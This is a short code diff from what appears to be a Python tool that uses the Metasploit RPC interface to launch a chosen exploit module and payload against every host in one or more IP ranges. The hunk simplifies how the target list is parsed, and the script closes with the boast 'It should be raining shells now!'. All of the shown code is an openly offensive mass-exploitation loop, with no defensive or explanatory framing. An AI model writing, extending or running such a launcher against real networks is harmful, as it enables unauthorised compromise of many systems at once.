@@ -55,11 +55,10 @@ def main():
         'PAYLOAD': args.payload,
         'DisablePayloadHandler': True
     })
-    for target_range in args.targets.split(','):
-        for target in explode_ip_ranges(target_range):
-            opts['RHOST'] = str(target)
-            rpc.call('module.execute', ['exploit', args.exploit, opts])
-            print("[-] Launched exploit against {}".format(target))
+    for target in explode_ip_ranges(args.targets):
+        opts['RHOST'] = str(target)
+        rpc.call('module.execute', ['exploit', args.exploit, opts])
+        print("[-] Launched exploit against {}".format(target))
     print("[+] Done. It should be raining shells now!")
 
 
